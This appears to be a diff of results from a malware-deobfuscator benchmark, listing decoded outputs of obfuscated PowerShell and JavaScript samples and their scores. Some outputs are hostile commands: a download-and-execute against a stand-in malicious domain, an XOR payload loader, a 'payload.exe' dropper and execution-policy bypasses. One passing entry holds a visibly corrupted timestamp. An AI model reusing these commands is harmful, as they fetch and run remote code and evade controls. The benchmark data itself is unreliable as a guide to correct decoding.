@@ -1,15 +1,19 @@
 {
   "total": 84,
-  "passed": 30,
-  "hit_rate": 0.3571,
+  "passed": 35,
+  "hit_rate": 0.4167,
   "threshold": 0.6,
   "results": [
     {
       "sha1": "7e0a722888e2f08b7a5e932db6a91dca4856fb77",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "IEX",
-      "ok": false
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize",
+        "decoder-powershell-encoded-command",
+        "semantic-ps-alias-expand"
+      ],
+      "output_head": "Invoke-Expression",
+      "ok": true
     },
     {
       "sha1": "fed5658f139d347e38b79f63e7769e6e90017c11",
@@ -22,12 +26,11 @@
     },
     {
       "sha1": "ffe2866c6b8664a52af4d5d13be0dee25e8ea938",
-      "engine": "rc2-orchestrator",
+      "engine": "convergence",
       "chain": [
-        "extract-payload",
-        "extract-payload"
+        "semantic-ps-alias-expand"
       ],
-      "output_head": "nslookup 45.148.10.181')",
+      "output_head": "powershell -c Invoke-Expression(Invoke-WebRequest http://malicious-test-domain.top/x); Invoke-Expression $(cmd /c 'nsloo",
       "ok": true
     },
     {
@@ -281,10 +284,12 @@
     },
     {
       "sha1": "8064f1b8d1e57ae9b384076d70eeed9b47ac6bf4",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "2025-02-14T12:34:56Z INFO service started",
-      "ok": false
+      "engine": "convergence",
+      "chain": [
+        "content-numeric-constant-fold"
+      ],
+      "output_head": "2023-14T12:34:56Z INFO service started",
+      "ok": true
     },
     {
       "sha1": "113cea36a6da4c4bc8627039b4f3d067aca2c4e1",
@@ -339,25 +344,25 @@
     },
     {
       "sha1": "5fd384bfadd38c3f124a8f654b47c069ee55dde9",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "\ufffd",
+      "output_head": "powershell -e ABC",
       "ok": false
     },
     {
       "sha1": "97b8825cc08fdde82d18aaa26f4c1dab3fa963c9",
-      "engine": "rc2-orchestrator",
+      "engine": "convergence",
       "chain": [
-        "powershell-xor-inline-key"
+        "semantic-ps-alias-expand"
       ],
-      "output_head": "La@kTDRIyRqRZAU",
+      "output_head": "$k=[System.Text.Encoding]::ASCII.GetBytes(\"KEY\"); $b=[byte[]](7,36,25,32,17,29,25,12,32,25,52,11,17,4,12); $d=-join(0..(",
       "ok": true
     },
     {
       "sha1": "f18d46780fda16ff0927300bdc7cd4f7112bf2da",
       "engine": "llm-l3",
       "chain": [],
-      "output_head": "python -c 'print(1+1)'",
+      "output_head": "print(1+1)",
       "ok": false
     },
     {
@@ -411,9 +416,9 @@
     },
     {
       "sha1": "f9f75777c6ec5ce767f90a3564eba599398a4d58",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
+      "output_head": "binary-A",
       "ok": false
     },
     {
@@ -645,30 +650,11 @@
     },
     {
       "sha1": "d6be764edc6030fc64f63aa44e31140155bbf56c",
-      "engine": "rc2-orchestrator",
+      "engine": "convergence",
       "chain": [
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize",
-        "crypto-api-annotator",
-        "powershell-backtick-normalize"
+        "content-env-var-case-normalize"
       ],
-      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 OpenSSL:AES-CBC          key_source=inline recovery=runtime-required",
+      "output_head": "openssl enc -aes-256-cbc -in backup.tgz -out backup.tgz.enc -k $env:backup_key",
       "ok": true
     },
     {
@@ -696,10 +682,12 @@
     },
     {
       "sha1": "e43fc82dfe47d42a53b70957b028fec7853d3165",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "Write-Host '[+] Mixed Case Test'",
-      "ok": false
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize"
+      ],
+      "output_head": "PoWeRsHeLl.eXe,-noprofile,-executionpolicy,ByPaSs,-command,\"Write-Host '[+] Mixed Case Test'\"",
+      "ok": true
     },
     {
       "sha1": "4b1a07b5a78dcdbea29be3c287903a41df793e2c",
@@ -712,10 +700,12 @@
     },
     {
       "sha1": "f87fa6b84bf4799448d1eca995e96ac9e533473e",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "powershell.exe -NoProfile -eXecUtIonPoLicY UnReStRiCtEd",
-      "ok": false
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize"
+      ],
+      "output_head": "powershell.exe -noprofile -executionpolicy UnReStRiCtEd",
+      "ok": true
     },
     {
       "sha1": "2e26648e784ec7a0cf4d08534ddda41df35f1a30",
@@ -756,7 +746,7 @@
     },
     {
       "sha1": "157fa2cf7908b959ec6cae7b4ca0e8463f2777c3",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
       "output_head": "--runaszvideo=TRUE --useroption=2347222064534913024 --useroption2=1152956688981395520 --useroption3=6917600633341970944 ",
       "ok": false
@@ -833,10 +823,12 @@
     },
     {
       "sha1": "ca1cc8941071fd8ef90f6fcc757a7f0bd0c60151",
-      "engine": "llm-l3",
-      "chain": [],
-      "output_head": "powershell -NoProfile Write-Host \"Decoder Validation\"",
-      "ok": false
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize"
+      ],
+      "output_head": "powershell -noprofile Write-Host \"Decoder Validation\"",
+      "ok": true
     },
     {
       "sha1": "eb1e5629474943b79f80e1f77b32c0486d6df8f0",
@@ -860,14 +852,11 @@
     },
     {
       "sha1": "699cb60ef23bf6b5407ead7e59cadf0d2ced0d68",
-      "engine": "magic",
+      "engine": "convergence",
       "chain": [
-        "ascii-decimal-decode",
-        "xor-brute",
-        "powershell-backtick-normalize",
-        "powershell-alias-normalize"
+        "decoder-xor-byte-array"
       ],
-      "output_head": "(powershell-alias-normalize \u00b7 no known aliases found)",
+      "output_head": "44776611003322dd",
       "ok": true
     }
   ]
